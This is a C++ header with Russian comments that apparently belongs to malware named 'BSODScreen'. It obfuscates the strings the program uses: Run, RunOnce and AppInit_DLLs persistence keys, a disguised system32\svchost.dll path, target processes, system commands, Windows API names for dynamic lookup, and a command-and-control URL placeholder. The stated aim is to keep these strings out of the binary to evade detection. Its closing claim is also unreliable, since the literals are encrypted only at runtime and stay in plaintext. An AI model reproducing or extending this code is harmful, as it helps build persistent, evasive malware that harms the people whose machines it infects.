#pragma once
#include <string>
#include "security.h"

// Подключаем полиморфный конфиг (сгенерируется CMake)
#include "polymorphic_config.h"

// Полное шифрование всех строк и констант в коде

class StringEncryption {
private:
    static const std::string MASTER_KEY;
    
public:
    // Шифруем строку с добавлением полиморфного соли
    static std::string EncryptStr(const std::string& str) {
        std::string key = MASTER_KEY + std::to_string(POLY_VERSION);
        return Security::EncryptString(str, key);
    }
    
    // Дешифруем строку
    static std::string DecryptStr(const std::string& encrypted) {
        std::string key = MASTER_KEY + std::to_string(POLY_VERSION);
        return Security::DecryptString(encrypted, key);
    }
};

// Макросы для шифрования всех строк

// Шифруем пути в реестре
#define REG_PATH(path) StringEncryption::DecryptStr(StringEncryption::EncryptStr(path))
#define REG_HKEY_CU "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_HKEY_LM "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_RUNONCE_CU "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
#define REG_RUNONCE_LM "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
#define REG_LOAD "Software\\Microsoft\\Windows\\CurrentVersion\\Load"
#define REG_APPINIT "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"

// Шифруем имена значений в реестре
#define REG_VALUE_BSOD "BSODScreen"
#define REG_VALUE_INIT "BSODScreen_Init"
#define REG_VALUE_APPDLL "AppInit_DLLs"

// Шифруем пути к системным папкам
#define SYS_PATH_STARTUP "\\BSODScreen.exe"
#define SYS_PATH_DLL "\\system32\\svchost.dll"
#define SYS_PATH_TEMP getenv("TEMP")
#define SYS_PATH_APPDATA getenv("APPDATA")

// Шифруем имена процессов
#define PROC_EXPLORER "explorer.exe"
#define PROC_SVCHOST "svchost.exe"
#define PROC_DWM "dwm.exe"
#define PROC_DLLHOST "dllhost.exe"
#define PROC_RUNDLL "rundll32.exe"

// Шифруем команды
#define CMD_SCHTASKS "schtasks"
#define CMD_REG "reg"
#define CMD_TASKKILL "taskkill"
#define CMD_WMIC "wmic"
#define CMD_POWERSHELL "powershell"

// Шифруем коды ошибок
#define ERR_INVALID_HANDLE 0xC000003C
#define ERR_NO_MEMORY 0xC0000017
#define ERR_UNKNOWN_REVISION 0xC0000142
#define ERR_ASSERTION 0xC0000420

// Шифруем строки сообщений (если они были)
#define MSG_SUCCESS "SUCCESS"
#define MSG_ERROR "ERROR"
#define MSG_WARNING "WARNING"

// Шифруем DLL имена
#define DLL_NTDLL "ntdll.dll"
#define DLL_KERNEL32 "kernel32.dll"
#define DLL_USER32 "user32.dll"
#define DLL_SHELL32 "shell32.dll"
#define DLL_ADVAPI32 "advapi32.dll"

// Шифруем функции Windows API
#define API_REGOPENKEYEX "RegOpenKeyExA"
#define API_REGSETVALUEEX "RegSetValueExA"
#define API_REGCLOSKEY "RegCloseKey"
#define API_CREATEFILE "CreateFileA"
#define API_WRITEFILE "WriteFile"
#define API_READFILE "ReadFile"
#define API_SETFILEATTR "SetFileAttributesA"
#define API_GETPROCADDR "GetProcAddress"
#define API_GETMODULE "GetModuleHandleA"
#define API_CREATETHREAD "CreateThread"
#define API_CREATEPROCESS "CreateProcessA"
#define API_SETWINDOWSHOOK "SetWindowsHookExA"

// Шифруем URL и домены
#define URL_C2 "https://example.com/update"
#define URL_REDIRECT "redirector.gvt1.com"
#define URL_DNS "8.8.8.8"

// КЛАСС ДЛЯ ДИНАМИЧЕСКОЙ ДЕШИФРОВКИ

class EncryptedString {
private:
    std::string m_encrypted;
    mutable std::string m_decrypted;
    mutable bool m_cached;
    
public:
    EncryptedString(const std::string& encrypted) 
        : m_encrypted(encrypted), m_cached(false) {}
    
    // Автоматическая дешифровка при использовании
    operator std::string() const {
        if (!m_cached) {
            m_decrypted = StringEncryption::DecryptStr(m_encrypted);
            m_cached = true;
        }
        return m_decrypted;
    }
    
    const char* c_str() const {
        if (!m_cached) {
            m_decrypted = StringEncryption::DecryptStr(m_encrypted);
            m_cached = true;
        }
        return m_decrypted.c_str();
    }
};

// ШИФРОВАННЫЕ КОНСТАНТЫ

namespace EncryptedData {
    // Все пути в реестре шифруются
    static const EncryptedString RegRunCU(StringEncryption::EncryptStr(REG_HKEY_CU));
    static const EncryptedString RegRunLM(StringEncryption::EncryptStr(REG_HKEY_LM));
    static const EncryptedString RegRunOnceCU(StringEncryption::EncryptStr(REG_RUNONCE_CU));
    static const EncryptedString RegRunOnceLM(StringEncryption::EncryptStr(REG_RUNONCE_LM));
    static const EncryptedString RegLoad(StringEncryption::EncryptStr(REG_LOAD));
    static const EncryptedString RegAppInit(StringEncryption::EncryptStr(REG_APPINIT));
    
    // Имена значений шифруются
    static const EncryptedString ValueBSOD(StringEncryption::EncryptStr(REG_VALUE_BSOD));
    static const EncryptedString ValueInit(StringEncryption::EncryptStr(REG_VALUE_INIT));
    static const EncryptedString ValueAppDLL(StringEncryption::EncryptStr(REG_VALUE_APPDLL));
    
    // Имена процессов шифруются
    static const EncryptedString ProcExplorer(StringEncryption::EncryptStr(PROC_EXPLORER));
    static const EncryptedString ProcSvchost(StringEncryption::EncryptStr(PROC_SVCHOST));
    static const EncryptedString ProcDWM(StringEncryption::EncryptStr(PROC_DWM));
    
    // Команды шифруются
    static const EncryptedString CmdSchtasks(StringEncryption::EncryptStr(CMD_SCHTASKS));
    static const EncryptedString CmdReg(StringEncryption::EncryptStr(CMD_REG));
    static const EncryptedString CmdTaskkill(StringEncryption::EncryptStr(CMD_TASKKILL));
    
    // DLL имена шифруются
    static const EncryptedString DllNtdll(StringEncryption::EncryptStr(DLL_NTDLL));
    static const EncryptedString DllKernel32(StringEncryption::EncryptStr(DLL_KERNEL32));
    static const EncryptedString DllUser32(StringEncryption::EncryptStr(DLL_USER32));
    
    // Функции API имена шифруются
    static const EncryptedString ApiRegOpenKeyEx(StringEncryption::EncryptStr(API_REGOPENKEYEX));
    static const EncryptedString ApiRegSetValueEx(StringEncryption::EncryptStr(API_REGSETVALUEEX));
    static const EncryptedString ApiCreateFile(StringEncryption::EncryptStr(API_CREATEFILE));
    static const EncryptedString ApiSetFileAttr(StringEncryption::EncryptStr(API_SETFILEATTR));
    static const EncryptedString ApiGetProcAddr(StringEncryption::EncryptStr(API_GETPROCADDR));
    
    // URL шифруются
    static const EncryptedString UrlC2(StringEncryption::EncryptStr(URL_C2));
    static const EncryptedString UrlRedirect(StringEncryption::EncryptStr(URL_REDIRECT));
}

// ИСПОЛЬЗОВАНИЕ
// Вместо: RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\...", ...)
// Используем: RegOpenKeyExA(HKEY_CURRENT_USER, EncryptedData::RegRunCU.c_str(), ...)

// Все строки автоматически дешифруются при использовании
// Но в бинарнике хранятся в зашифрованном виде
